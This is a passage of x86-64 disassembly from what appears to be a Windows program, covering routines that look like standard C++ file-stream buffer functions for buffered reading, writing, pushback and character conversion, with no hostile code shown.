   1400051d4:	48 89 08             	mov    %rcx,(%rax)
   1400051d7:	48 8b 46 50          	mov    0x50(%rsi),%rax
   1400051db:	89 10                	mov    %edx,(%rax)
   1400051dd:	48 81 fb ff 0f 00 00 	cmp    $0xfff,%rbx
   1400051e4:	76 38                	jbe    0x14000521e
   1400051e6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400051ed:	00 00 00 
   1400051f0:	4c 8b 8e 80 00 00 00 	mov    0x80(%rsi),%r9
   1400051f7:	ba 01 00 00 00       	mov    $0x1,%edx
   1400051fc:	41 b8 ff 0f 00 00    	mov    $0xfff,%r8d
   140005202:	48 8b cd             	mov    %rbp,%rcx
   140005205:	ff 15 9d 33 00 00    	call   *0x339d(%rip)        # 0x1400085a8
   14000520b:	48 03 e8             	add    %rax,%rbp
   14000520e:	48 2b d8             	sub    %rax,%rbx
   140005211:	48 3d ff 0f 00 00    	cmp    $0xfff,%rax
   140005217:	75 25                	jne    0x14000523e
   140005219:	48 3b d8             	cmp    %rax,%rbx
   14000521c:	77 d2                	ja     0x1400051f0
   14000521e:	48 85 db             	test   %rbx,%rbx
   140005221:	74 1b                	je     0x14000523e
   140005223:	4c 8b 8e 80 00 00 00 	mov    0x80(%rsi),%r9
   14000522a:	4c 8b c3             	mov    %rbx,%r8
   14000522d:	ba 01 00 00 00       	mov    $0x1,%edx
   140005232:	48 8b cd             	mov    %rbp,%rcx
   140005235:	ff 15 6d 33 00 00    	call   *0x336d(%rip)        # 0x1400085a8
   14000523b:	48 2b d8             	sub    %rax,%rbx
   14000523e:	4c 2b f3             	sub    %rbx,%r14
   140005241:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   140005246:	49 8b c6             	mov    %r14,%rax
   140005249:	48 83 c4 30          	add    $0x30,%rsp
   14000524d:	41 5e                	pop    %r14
   14000524f:	5e                   	pop    %rsi
   140005250:	5d                   	pop    %rbp
   140005251:	c3                   	ret
   140005252:	cc                   	int3
   140005253:	cc                   	int3
   140005254:	cc                   	int3
   140005255:	cc                   	int3
   140005256:	cc                   	int3
   140005257:	cc                   	int3
   140005258:	cc                   	int3
   140005259:	cc                   	int3
   14000525a:	cc                   	int3
   14000525b:	cc                   	int3
   14000525c:	cc                   	int3
   14000525d:	cc                   	int3
   14000525e:	cc                   	int3
   14000525f:	cc                   	int3
   140005260:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140005265:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000526a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000526f:	55                   	push   %rbp
   140005270:	48 8b ec             	mov    %rsp,%rbp
   140005273:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   14000527a:	48 8b 05 bf 7d 00 00 	mov    0x7dbf(%rip),%rax        # 0x14000d040
   140005281:	48 33 c4             	xor    %rsp,%rax
   140005284:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140005288:	48 8b f9             	mov    %rcx,%rdi
   14000528b:	48 8b 41 38          	mov    0x38(%rcx),%rax
   14000528f:	48 8b 08             	mov    (%rax),%rcx
   140005292:	48 85 c9             	test   %rcx,%rcx
   140005295:	74 2c                	je     0x1400052c3
   140005297:	48 8b 57 50          	mov    0x50(%rdi),%rdx
   14000529b:	4c 63 0a             	movslq (%rdx),%r9
   14000529e:	4a 8d 04 09          	lea    (%rcx,%r9,1),%rax
   1400052a2:	48 3b c8             	cmp    %rax,%rcx
   1400052a5:	73 1c                	jae    0x1400052c3
   1400052a7:	41 8d 41 ff          	lea    -0x1(%r9),%eax
   1400052ab:	89 02                	mov    %eax,(%rdx)
   1400052ad:	48 8b 4f 38          	mov    0x38(%rdi),%rcx
   1400052b1:	48 8b 11             	mov    (%rcx),%rdx
   1400052b4:	48 8d 42 01          	lea    0x1(%rdx),%rax
   1400052b8:	48 89 01             	mov    %rax,(%rcx)
   1400052bb:	0f b6 02             	movzbl (%rdx),%eax
   1400052be:	e9 5c 02 00 00       	jmp    0x14000551f
   1400052c3:	48 83 bf 80 00 00 00 	cmpq   $0x0,0x80(%rdi)
   1400052ca:	00 
   1400052cb:	75 0a                	jne    0x1400052d7
   1400052cd:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400052d2:	e9 48 02 00 00       	jmp    0x14000551f
   1400052d7:	4c 8b 4f 18          	mov    0x18(%rdi),%r9
   1400052db:	48 8d 47 70          	lea    0x70(%rdi),%rax
   1400052df:	49 39 01             	cmp    %rax,(%r9)
   1400052e2:	75 20                	jne    0x140005304
   1400052e4:	48 8b 97 90 00 00 00 	mov    0x90(%rdi),%rdx
   1400052eb:	48 8b 8f 88 00 00 00 	mov    0x88(%rdi),%rcx
   1400052f2:	49 89 09             	mov    %rcx,(%r9)
   1400052f5:	48 8b 47 38          	mov    0x38(%rdi),%rax
   1400052f9:	48 89 08             	mov    %rcx,(%rax)
   1400052fc:	2b d1                	sub    %ecx,%edx
   1400052fe:	48 8b 47 50          	mov    0x50(%rdi),%rax
   140005302:	89 10                	mov    %edx,(%rax)
   140005304:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   14000530b:	48 83 7f 68 00       	cmpq   $0x0,0x68(%rdi)
   140005310:	75 1c                	jne    0x14000532e
   140005312:	ff 15 78 32 00 00    	call   *0x3278(%rip)        # 0x140008590
   140005318:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000531b:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   140005320:	0f 84 f7 01 00 00    	je     0x14000551d
   140005326:	0f b6 d8             	movzbl %al,%ebx
   140005329:	e9 ef 01 00 00       	jmp    0x14000551d
   14000532e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140005331:	0f 11 45 d8          	movups %xmm0,-0x28(%rbp)
   140005335:	48 c7 45 e8 00 00 00 	movq   $0x0,-0x18(%rbp)
   14000533c:	00 
   14000533d:	48 c7 45 f0 0f 00 00 	movq   $0xf,-0x10(%rbp)
   140005344:	00 
   140005345:	c6 45 d8 00          	movb   $0x0,-0x28(%rbp)
   140005349:	ff 15 41 32 00 00    	call   *0x3241(%rip)        # 0x140008590
   14000534f:	44 8b c8             	mov    %eax,%r9d
   140005352:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005355:	0f 84 01 01 00 00    	je     0x14000545c
   14000535b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140005360:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   140005364:	4c 8b 45 f0          	mov    -0x10(%rbp),%r8
   140005368:	49 3b d0             	cmp    %r8,%rdx
   14000536b:	73 20                	jae    0x14000538d
   14000536d:	48 8d 4a 01          	lea    0x1(%rdx),%rcx
   140005371:	48 89 4d e8          	mov    %rcx,-0x18(%rbp)
   140005375:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140005379:	49 83 f8 0f          	cmp    $0xf,%r8
   14000537d:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   140005382:	44 88 0c 10          	mov    %r9b,(%rax,%rdx,1)
   140005386:	c6 44 10 01 00       	movb   $0x0,0x1(%rax,%rdx,1)
   14000538b:	eb 09                	jmp    0x140005396
   14000538d:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140005391:	e8 0a 0f 00 00       	call   0x1400062a0
   140005396:	48 8d 55 d8          	lea    -0x28(%rbp),%rdx
   14000539a:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   14000539f:	48 0f 47 55 d8       	cmova  -0x28(%rbp),%rdx
   1400053a4:	4c 8d 45 d8          	lea    -0x28(%rbp),%r8
   1400053a8:	4c 0f 47 45 d8       	cmova  -0x28(%rbp),%r8
   1400053ad:	4c 8b 4d e8          	mov    -0x18(%rbp),%r9
   1400053b1:	4c 03 ca             	add    %rdx,%r9
   1400053b4:	48 8d 45 c8          	lea    -0x38(%rbp),%rax
   1400053b8:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400053bd:	48 8d 45 d1          	lea    -0x2f(%rbp),%rax
   1400053c1:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400053c6:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   1400053ca:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400053cf:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   1400053d3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400053d8:	48 8d 57 74          	lea    0x74(%rdi),%rdx
   1400053dc:	48 8b 4f 68          	mov    0x68(%rdi),%rcx
   1400053e0:	ff 15 e2 2d 00 00    	call   *0x2de2(%rip)        # 0x1400081c8
   1400053e6:	85 c0                	test   %eax,%eax
   1400053e8:	74 09                	je     0x1400053f3
   1400053ea:	83 e8 01             	sub    $0x1,%eax
   1400053ed:	0f 85 c2 00 00 00    	jne    0x1400054b5
   1400053f3:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   1400053f7:	48 8b 5d e8          	mov    -0x18(%rbp),%rbx
   1400053fb:	48 39 45 c8          	cmp    %rax,-0x38(%rbp)
   1400053ff:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   140005403:	0f 85 c4 00 00 00    	jne    0x1400054cd
   140005409:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   14000540e:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   140005413:	4c 8b 4d c0          	mov    -0x40(%rbp),%r9
   140005417:	4c 2b c8             	sub    %rax,%r9
   14000541a:	49 3b d9             	cmp    %r9,%rbx
   14000541d:	4c 0f 42 cb          	cmovb  %rbx,%r9
   140005421:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140005425:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   14000542a:	48 0f 47 4d d8       	cmova  -0x28(%rbp),%rcx
   14000542f:	49 2b d9             	sub    %r9,%rbx
   140005432:	4c 8d 43 01          	lea    0x1(%rbx),%r8
   140005436:	49 8d 14 09          	lea    (%r9,%rcx,1),%rdx
   14000543a:	e8 d2 25 00 00       	call   0x140007a11
   14000543f:	48 89 5d e8          	mov    %rbx,-0x18(%rbp)
   140005443:	48 8b 8f 80 00 00 00 	mov    0x80(%rdi),%rcx
   14000544a:	ff 15 40 31 00 00    	call   *0x3140(%rip)        # 0x140008590
   140005450:	44 8b c8             	mov    %eax,%r9d
   140005453:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005456:	0f 85 04 ff ff ff    	jne    0x140005360
   14000545c:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   140005461:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   140005465:	48 83 fa 0f          	cmp    $0xf,%rdx
   140005469:	0f 86 ae 00 00 00    	jbe    0x14000551d
   14000546f:	48 ff c2             	inc    %rdx
   140005472:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
   140005476:	48 8b c1             	mov    %rcx,%rax
   140005479:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140005480:	0f 82 92 00 00 00    	jb     0x140005518
   140005486:	48 83 c2 27          	add    $0x27,%rdx
   14000548a:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   14000548e:	48 2b c1             	sub    %rcx,%rax
   140005491:	48 83 e8 08          	sub    $0x8,%rax
   140005495:	48 83 f8 1f          	cmp    $0x1f,%rax
   140005499:	76 7d                	jbe    0x140005518
   14000549b:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400054a2:	00 00 
   1400054a4:	45 33 c9             	xor    %r9d,%r9d
   1400054a7:	45 33 c0             	xor    %r8d,%r8d
   1400054aa:	33 d2                	xor    %edx,%edx
   1400054ac:	33 c9                	xor    %ecx,%ecx
   1400054ae:	ff 15 0c 30 00 00    	call   *0x300c(%rip)        # 0x1400084c0
   1400054b4:	90                   	nop
   1400054b5:	83 f8 02             	cmp    $0x2,%eax
   1400054b8:	75 a2                	jne    0x14000545c
   1400054ba:	48 8d 45 d8          	lea    -0x28(%rbp),%rax
   1400054be:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   1400054c3:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   1400054c8:	0f be 18             	movsbl (%rax),%ebx
   1400054cb:	eb 94                	jmp    0x140005461
   1400054cd:	48 83 7d f0 0f       	cmpq   $0xf,-0x10(%rbp)
   1400054d2:	48 0f 47 45 d8       	cmova  -0x28(%rbp),%rax
   1400054d7:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
   1400054db:	48 2b d9             	sub    %rcx,%rbx
   1400054de:	48 03 d8             	add    %rax,%rbx
   1400054e1:	48 85 db             	test   %rbx,%rbx
   1400054e4:	7e 29                	jle    0x14000550f
   1400054e6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400054ed:	00 00 00 
   1400054f0:	48 ff cb             	dec    %rbx
   1400054f3:	0f be 0c 0b          	movsbl (%rbx,%rcx,1),%ecx
   1400054f7:	48 8b 97 80 00 00 00 	mov    0x80(%rdi),%rdx
   1400054fe:	ff 15 74 30 00 00    	call   *0x3074(%rip)        # 0x140008578
   140005504:	48 85 db             	test   %rbx,%rbx
   140005507:	7e 06                	jle    0x14000550f
   140005509:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
   14000550d:	eb e1                	jmp    0x1400054f0
   14000550f:	0f b6 5d d0          	movzbl -0x30(%rbp),%ebx
   140005513:	e9 49 ff ff ff       	jmp    0x140005461
   140005518:	e8 83 14 00 00       	call   0x1400069a0
   14000551d:	8b c3                	mov    %ebx,%eax
   14000551f:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
   140005523:	48 33 cc             	xor    %rsp,%rcx
   140005526:	e8 55 14 00 00       	call   0x140006980
   14000552b:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
   140005532:	00 
   140005533:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140005537:	49 8b 73 20          	mov    0x20(%r11),%rsi
   14000553b:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   14000553f:	49 8b e3             	mov    %r11,%rsp
   140005542:	5d                   	pop    %rbp
   140005543:	c3                   	ret
   140005544:	cc                   	int3
   140005545:	cc                   	int3
   140005546:	cc                   	int3
   140005547:	cc                   	int3
   140005548:	cc                   	int3
   140005549:	cc                   	int3
   14000554a:	cc                   	int3
   14000554b:	cc                   	int3
   14000554c:	cc                   	int3
   14000554d:	cc                   	int3
   14000554e:	cc                   	int3
   14000554f:	cc                   	int3
   140005550:	40 53                	rex push %rbx
   140005552:	48 83 ec 20          	sub    $0x20,%rsp
   140005556:	48 8b 41 38          	mov    0x38(%rcx),%rax
   14000555a:	48 8b d9             	mov    %rcx,%rbx
   14000555d:	48 8b 08             	mov    (%rax),%rcx
   140005560:	48 85 c9             	test   %rcx,%rcx
   140005563:	74 18                	je     0x14000557d
   140005565:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140005569:	48 63 10             	movslq (%rax),%rdx
   14000556c:	48 03 d1             	add    %rcx,%rdx
   14000556f:	48 3b ca             	cmp    %rdx,%rcx
   140005572:	73 09                	jae    0x14000557d
   140005574:	0f b6 01             	movzbl (%rcx),%eax
   140005577:	48 83 c4 20          	add    $0x20,%rsp
   14000557b:	5b                   	pop    %rbx
   14000557c:	c3                   	ret
   14000557d:	48 8b 03             	mov    (%rbx),%rax
   140005580:	48 8b cb             	mov    %rbx,%rcx
   140005583:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140005588:	ff 50 38             	call   *0x38(%rax)
   14000558b:	8b f8                	mov    %eax,%edi
   14000558d:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005590:	75 0b                	jne    0x14000559d
   140005592:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   140005597:	48 83 c4 20          	add    $0x20,%rsp
   14000559b:	5b                   	pop    %rbx
   14000559c:	c3                   	ret
   14000559d:	48 8b 03             	mov    (%rbx),%rax
   1400055a0:	8b d7                	mov    %edi,%edx
   1400055a2:	48 8b cb             	mov    %rbx,%rcx
   1400055a5:	ff 50 20             	call   *0x20(%rax)
   1400055a8:	8b c7                	mov    %edi,%eax
   1400055aa:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   1400055af:	48 83 c4 20          	add    $0x20,%rsp
   1400055b3:	5b                   	pop    %rbx
   1400055b4:	c3                   	ret
   1400055b5:	cc                   	int3
   1400055b6:	cc                   	int3
   1400055b7:	cc                   	int3
   1400055b8:	cc                   	int3
   1400055b9:	cc                   	int3
   1400055ba:	cc                   	int3
   1400055bb:	cc                   	int3
   1400055bc:	cc                   	int3
   1400055bd:	cc                   	int3
   1400055be:	cc                   	int3
   1400055bf:	cc                   	int3
   1400055c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400055c5:	57                   	push   %rdi
   1400055c6:	48 83 ec 20          	sub    $0x20,%rsp
   1400055ca:	48 8b 41 38          	mov    0x38(%rcx),%rax
   1400055ce:	48 8b d9             	mov    %rcx,%rbx
   1400055d1:	8b fa                	mov    %edx,%edi
   1400055d3:	48 8b 08             	mov    (%rax),%rcx
   1400055d6:	48 85 c9             	test   %rcx,%rcx
   1400055d9:	74 38                	je     0x140005613
   1400055db:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400055df:	48 39 08             	cmp    %rcx,(%rax)
   1400055e2:	73 2f                	jae    0x140005613
   1400055e4:	83 fa ff             	cmp    $0xffffffff,%edx
   1400055e7:	74 08                	je     0x1400055f1
   1400055e9:	0f b6 41 ff          	movzbl -0x1(%rcx),%eax
   1400055ed:	3b c2                	cmp    %edx,%eax
   1400055ef:	75 22                	jne    0x140005613
   1400055f1:	48 8b 43 50          	mov    0x50(%rbx),%rax
   1400055f5:	ff 00                	incl   (%rax)
   1400055f7:	48 8b 43 38          	mov    0x38(%rbx),%rax
   1400055fb:	48 ff 08             	decq   (%rax)
   1400055fe:	33 c0                	xor    %eax,%eax
   140005600:	83 ff ff             	cmp    $0xffffffff,%edi
   140005603:	0f 44 f8             	cmove  %eax,%edi
   140005606:	8b c7                	mov    %edi,%eax
   140005608:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000560d:	48 83 c4 20          	add    $0x20,%rsp
   140005611:	5f                   	pop    %rdi
   140005612:	c3                   	ret
   140005613:	48 8b 93 80 00 00 00 	mov    0x80(%rbx),%rdx
   14000561a:	48 85 d2             	test   %rdx,%rdx
   14000561d:	74 73                	je     0x140005692
   14000561f:	83 ff ff             	cmp    $0xffffffff,%edi
   140005622:	74 6e                	je     0x140005692
   140005624:	48 83 7b 68 00       	cmpq   $0x0,0x68(%rbx)
   140005629:	75 0f                	jne    0x14000563a
   14000562b:	40 0f b6 cf          	movzbl %dil,%ecx
   14000562f:	ff 15 43 2f 00 00    	call   *0x2f43(%rip)        # 0x140008578
   140005635:	83 f8 ff             	cmp    $0xffffffff,%eax
   140005638:	75 cc                	jne    0x140005606
   14000563a:	4c 8b 4b 38          	mov    0x38(%rbx),%r9
   14000563e:	48 8d 53 70          	lea    0x70(%rbx),%rdx
   140005642:	49 39 11             	cmp    %rdx,(%r9)
   140005645:	74 4b                	je     0x140005692
   140005647:	4c 8b 53 18          	mov    0x18(%rbx),%r10
   14000564b:	4c 8d 43 50          	lea    0x50(%rbx),%r8
   14000564f:	40 88 3a             	mov    %dil,(%rdx)
   140005652:	49 8b 02             	mov    (%r10),%rax
   140005655:	48 3b c2             	cmp    %rdx,%rax
   140005658:	74 17                	je     0x140005671
   14000565a:	48 89 83 88 00 00 00 	mov    %rax,0x88(%rbx)
   140005661:	49 8b 00             	mov    (%r8),%rax
   140005664:	48 63 08             	movslq (%rax),%rcx
   140005667:	49 03 09             	add    (%r9),%rcx
   14000566a:	48 89 8b 90 00 00 00 	mov    %rcx,0x90(%rbx)
   140005671:	49 89 12             	mov    %rdx,(%r10)
   140005674:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140005678:	2b da                	sub    %edx,%ebx
   14000567a:	83 c3 71             	add    $0x71,%ebx
   14000567d:	48 89 10             	mov    %rdx,(%rax)
   140005680:	49 8b 00             	mov    (%r8),%rax
   140005683:	89 18                	mov    %ebx,(%rax)
   140005685:	8b c7                	mov    %edi,%eax
   140005687:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000568c:	48 83 c4 20          	add    $0x20,%rsp
   140005690:	5f                   	pop    %rdi
   140005691:	c3                   	ret
   140005692:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005697:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000569c:	48 83 c4 20          	add    $0x20,%rsp
   1400056a0:	5f                   	pop    %rdi
   1400056a1:	c3                   	ret
   1400056a2:	cc                   	int3
   1400056a3:	cc                   	int3
   1400056a4:	cc                   	int3
   1400056a5:	cc                   	int3
   1400056a6:	cc                   	int3
   1400056a7:	cc                   	int3
   1400056a8:	cc                   	int3
   1400056a9:	cc                   	int3
   1400056aa:	cc                   	int3
   1400056ab:	cc                   	int3
   1400056ac:	cc                   	int3
   1400056ad:	cc                   	int3
   1400056ae:	cc                   	int3
   1400056af:	cc                   	int3
   1400056b0:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400056b5:	57                   	push   %rdi
   1400056b6:	48 81 ec 80 00 00 00 	sub    $0x80,%rsp
   1400056bd:	48 8b 05 7c 79 00 00 	mov    0x797c(%rip),%rax        # 0x14000d040
   1400056c4:	48 33 c4             	xor    %rsp,%rax
   1400056c7:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   1400056cc:	8b fa                	mov    %edx,%edi
   1400056ce:	48 8b d9             	mov    %rcx,%rbx
   1400056d1:	83 fa ff             	cmp    $0xffffffff,%edx
   1400056d4:	75 07                	jne    0x1400056dd
   1400056d6:	33 c0                	xor    %eax,%eax
   1400056d8:	e9 6c 01 00 00       	jmp    0x140005849
   1400056dd:	48 8b 41 40          	mov    0x40(%rcx),%rax
   1400056e1:	48 8b 10             	mov    (%rax),%rdx
   1400056e4:	48 85 d2             	test   %rdx,%rdx
   1400056e7:	74 2e                	je     0x140005717
   1400056e9:	48 8b 41 58          	mov    0x58(%rcx),%rax
   1400056ed:	4c 63 00             	movslq (%rax),%r8
   1400056f0:	4a 8d 0c 02          	lea    (%rdx,%r8,1),%rcx
   1400056f4:	48 3b d1             	cmp    %rcx,%rdx
   1400056f7:	73 1e                	jae    0x140005717
   1400056f9:	41 8d 48 ff          	lea    -0x1(%r8),%ecx
   1400056fd:	89 08                	mov    %ecx,(%rax)
   1400056ff:	8b c7                	mov    %edi,%eax
   140005701:	48 8b 53 40          	mov    0x40(%rbx),%rdx
   140005705:	4c 8b 02             	mov    (%rdx),%r8
   140005708:	49 8d 48 01          	lea    0x1(%r8),%rcx
   14000570c:	48 89 0a             	mov    %rcx,(%rdx)
   14000570f:	41 88 38             	mov    %dil,(%r8)
   140005712:	e9 32 01 00 00       	jmp    0x140005849
   140005717:	48 83 bb 80 00 00 00 	cmpq   $0x0,0x80(%rbx)
   14000571e:	00 
   14000571f:	48 89 b4 24 a0 00 00 	mov    %rsi,0xa0(%rsp)
   140005726:	00 
   140005727:	0f 84 0f 01 00 00    	je     0x14000583c
   14000572d:	4c 8b 43 18          	mov    0x18(%rbx),%r8
   140005731:	48 8d 43 70          	lea    0x70(%rbx),%rax
   140005735:	49 39 00             	cmp    %rax,(%r8)
   140005738:	75 20                	jne    0x14000575a
   14000573a:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   140005741:	48 8b 93 90 00 00 00 	mov    0x90(%rbx),%rdx
   140005748:	49 89 08             	mov    %rcx,(%r8)
   14000574b:	2b d1                	sub    %ecx,%edx
   14000574d:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140005751:	48 89 08             	mov    %rcx,(%rax)
   140005754:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140005758:	89 10                	mov    %edx,(%rax)
   14000575a:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   14000575e:	48 85 c9             	test   %rcx,%rcx
   140005761:	75 22                	jne    0x140005785
   140005763:	48 8b 93 80 00 00 00 	mov    0x80(%rbx),%rdx
   14000576a:	40 0f be cf          	movsbl %dil,%ecx
   14000576e:	ff 15 e4 2d 00 00    	call   *0x2de4(%rip)        # 0x140008558
   140005774:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140005779:	3b c1                	cmp    %ecx,%eax
   14000577b:	0f 45 cf             	cmovne %edi,%ecx
   14000577e:	8b c1                	mov    %ecx,%eax
   140005780:	e9 bc 00 00 00       	jmp    0x140005841
   140005785:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000578a:	40 88 7c 24 50       	mov    %dil,0x50(%rsp)
   14000578f:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140005794:	48 8d 53 74          	lea    0x74(%rbx),%rdx
   140005798:	48 8d 44 24 78       	lea    0x78(%rsp),%rax
   14000579d:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400057a2:	4c 8d 4c 24 51       	lea    0x51(%rsp),%r9
   1400057a7:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   1400057ac:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400057b1:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   1400057b6:	48 8d 44 24 48       	lea    0x48(%rsp),%rax
   1400057bb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400057c0:	ff 15 fa 29 00 00    	call   *0x29fa(%rip)        # 0x1400081c0
   1400057c6:	85 c0                	test   %eax,%eax
   1400057c8:	74 2a                	je     0x1400057f4
   1400057ca:	83 e8 01             	sub    $0x1,%eax
   1400057cd:	74 25                	je     0x1400057f4
   1400057cf:	83 f8 02             	cmp    $0x2,%eax
   1400057d2:	75 68                	jne    0x14000583c
   1400057d4:	0f be 4c 24 50       	movsbl 0x50(%rsp),%ecx
   1400057d9:	48 8b 93 80 00 00 00 	mov    0x80(%rbx),%rdx
   1400057e0:	ff 15 72 2d 00 00    	call   *0x2d72(%rip)        # 0x140008558
   1400057e6:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   1400057eb:	3b c1                	cmp    %ecx,%eax
   1400057ed:	0f 45 cf             	cmovne %edi,%ecx
   1400057f0:	8b c1                	mov    %ecx,%eax
   1400057f2:	eb 4d                	jmp    0x140005841
   1400057f4:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400057f9:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   1400057fe:	48 2b f0             	sub    %rax,%rsi
   140005801:	74 1f                	je     0x140005822
   140005803:	4c 8b 8b 80 00 00 00 	mov    0x80(%rbx),%r9
   14000580a:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   14000580f:	4c 8b c6             	mov    %rsi,%r8
   140005812:	ba 01 00 00 00       	mov    $0x1,%edx
   140005817:	ff 15 53 2d 00 00    	call   *0x2d53(%rip)        # 0x140008570
   14000581d:	48 3b f0             	cmp    %rax,%rsi
   140005820:	75 1a                	jne    0x14000583c
   140005822:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140005827:	c6 43 71 01          	movb   $0x1,0x71(%rbx)
   14000582b:	48 39 44 24 48       	cmp    %rax,0x48(%rsp)
   140005830:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   140005835:	0f 45 cf             	cmovne %edi,%ecx
   140005838:	8b c1                	mov    %ecx,%eax
   14000583a:	eb 05                	jmp    0x140005841
   14000583c:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140005841:	48 8b b4 24 a0 00 00 	mov    0xa0(%rsp),%rsi
   140005848:	00 
   140005849:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   14000584e:	48 33 cc             	xor    %rsp,%rcx
   140005851:	e8 2a 11 00 00       	call   0x140006980
   140005856:	48 8b 9c 24 a8 00 00 	mov    0xa8(%rsp),%rbx
   14000585d:	00 
   14000585e:	48 81 c4 80 00 00 00 	add    $0x80,%rsp
   140005865:	5f                   	pop    %rdi
   140005866:	c3                   	ret
   140005867:	cc                   	int3
   140005868:	cc                   	int3
   140005869:	cc                   	int3
   14000586a:	cc                   	int3
   14000586b:	cc                   	int3
   14000586c:	cc                   	int3
   14000586d:	cc                   	int3
   14000586e:	cc                   	int3
   14000586f:	cc                   	int3
   140005870:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140005877:	48 85 c9             	test   %rcx,%rcx
   14000587a:	74 07                	je     0x140005883
   14000587c:	48 ff 25 d5 2b 00 00 	rex.W jmp *0x2bd5(%rip)        # 0x140008458
   140005883:	c3                   	ret
   140005884:	cc                   	int3
   140005885:	cc                   	int3
   140005886:	cc                   	int3
   140005887:	cc                   	int3
   140005888:	cc                   	int3
   140005889:	cc                   	int3
   14000588a:	cc                   	int3
   14000588b:	cc                   	int3
   14000588c:	cc                   	int3
   14000588d:	cc                   	int3
   14000588e:	cc                   	int3
   14000588f:	cc                   	int3
   140005890:	48 8b 89 80 00 00 00 	mov    0x80(%rcx),%rcx
   140005897:	48 85 c9             	test   %rcx,%rcx
   14000589a:	74 07                	je     0x1400058a3
   14000589c:	48 ff 25 bd 2b 00 00 	rex.W jmp *0x2bbd(%rip)        # 0x140008460
   1400058a3:	c3                   	ret
   1400058a4:	cc                   	int3
   1400058a5:	cc                   	int3
   1400058a6:	cc                   	int3
   1400058a7:	cc                   	int3
   1400058a8:	cc                   	int3
   1400058a9:	cc                   	int3
   1400058aa:	cc                   	int3
   1400058ab:	cc                   	int3
   1400058ac:	cc                   	int3
   1400058ad:	cc                   	int3
   1400058ae:	cc                   	int3
   1400058af:	cc                   	int3
   1400058b0:	40 53                	rex push %rbx
